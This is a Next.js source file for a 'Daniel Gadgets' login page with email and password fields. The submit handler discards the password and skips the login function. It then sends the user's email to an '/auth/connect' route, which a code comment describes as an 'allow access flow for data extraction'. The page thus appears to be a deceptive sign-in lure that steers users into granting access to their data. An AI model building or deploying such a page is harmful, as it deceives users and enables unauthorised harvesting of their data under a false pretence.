'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { useStore } from '@/components/StoreProvider';
import Chrome from '@/components/Chrome';
import Footer from '@/components/Footer';

const MENU_LINKS = [
  { href: '/', label: 'Home' },
  { href: 'https://featured.daniel-gadgets.com', label: 'Products' },
  { href: 'https://contact.daniel-gadgets.com', label: 'Support' },
];

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const { login, user, hydrated } = useStore();
  const router = useRouter();

  useEffect(() => {
    if (hydrated && user) {
      router.push('/');
    }
  }, [user, hydrated, router]);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!email.includes('@')) {
      setError('Please enter a valid email address.');
      return;
    }
    // Redirect to connect/allow access flow for data extraction
    router.push(`/auth/connect?email=${encodeURIComponent(email)}`);
  };

  if (!hydrated) return null;

  return (
    <>
      <Chrome menuLinks={MENU_LINKS} />
      
      <main className="sec login-page" id="main-content" style={{ minHeight: '80vh', display: 'flex', alignItems: 'center', justifyContent: 'center', paddingTop: '100px' }}>
        <div className="hud-corner hud-tl"></div>
        <div className="hud-corner hud-tr"></div>
        <div className="hud-corner hud-bl"></div>
        <div className="hud-corner hud-br"></div>

        <div className="auth-modal" style={{ position: 'relative', opacity: 1, transform: 'none', margin: '20px' }}>
          <div className="auth-header">
            <h2 className="auth-title">Welcome Back</h2>
            <p className="auth-sub">Sign in to your Daniel Gadgets account</p>
          </div>

          <form className="auth-form" onSubmit={handleSubmit}>
            {error && <p style={{ color: '#ff4d4d', fontSize: '0.9rem', marginBottom: '1rem' }}>{error}</p>}
            
            <div className="auth-input-group">
              <label className="auth-label">Email Address</label>
              <input
                type="email"
                className="auth-input"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="name@example.com"
                required
              />
            </div>

            <div className="auth-input-group">
              <label className="auth-label">Password</label>
              <input
                type="password"
                className="auth-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                required
              />
            </div>

            <button type="submit" className="auth-btn">
              Sign In
            </button>
          </form>

          <p className="auth-switch">
            Don&apos;t have an account?{' '}
            <Link href="/" className="auth-switch-btn">
              Return Home
            </Link>
          </p>
        </div>
      </main>

      <Footer full={false} />
    </>
  );
}
